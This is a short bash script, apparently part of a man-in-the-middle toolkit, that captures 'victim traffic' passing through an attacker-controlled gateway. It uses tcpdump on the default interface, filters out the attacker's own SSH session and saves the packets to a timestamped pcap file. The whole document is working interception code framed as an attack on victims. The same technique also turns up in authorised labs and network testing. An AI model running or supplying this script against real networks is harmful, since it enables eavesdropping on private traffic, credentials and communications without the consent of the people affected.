#!/usr/bin/env bash
# Capture victim traffic flowing through the MitM gateway.
#
# Filters OUT attacker's own SSH session — shows only forwarded victim traffic.
#
# Usage:
#   sudo bash mitm_intercept.sh                  # default: all victim traffic
#   sudo bash mitm_intercept.sh "tcp port 80"    # HTTP only
#   SAVE=0 sudo bash mitm_intercept.sh           # screen only, no pcap file

set -uo pipefail

[[ $EUID -ne 0 ]] && { echo "[ERROR] Run as root."; exit 1; }

IFACE="${IFACE:-$(ip -o -4 route show to default | awk '{print $5; exit}')}"
SAVE="${SAVE:-1}"
OUTFILE="mitm_capture_$(date +%Y%m%d_%H%M%S).pcap"

# Auto-detect attacker's own IP — exclude its SSH session from capture
# so only forwarded victim traffic is shown, not admin console noise.
ATTACKER_IP=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2; exit}' | cut -d/ -f1)
DEFAULT_FILTER="not arp and not (host $ATTACKER_IP and port 22)"
FILTER="${1:-$DEFAULT_FILTER}"

echo "[*] Listening on : $IFACE"
echo "[*] Attacker IP  : $ATTACKER_IP (excluded from SSH filter)"
echo "[*] Filter       : $FILTER"
[[ "$SAVE" == "1" ]] && echo "[*] Saving       → $OUTFILE"
echo "[*] Press Ctrl+C to stop."
echo ""

cleanup() {
    kill "${FILE_PID:-}" 2>/dev/null || true
}
trap cleanup INT TERM EXIT

if [[ "$SAVE" == "1" ]]; then
    tcpdump -i "$IFACE" -w "$OUTFILE" -U -n $FILTER &
    FILE_PID=$!
fi

# Foreground: print to screen
tcpdump -i "$IFACE" -n $FILTER
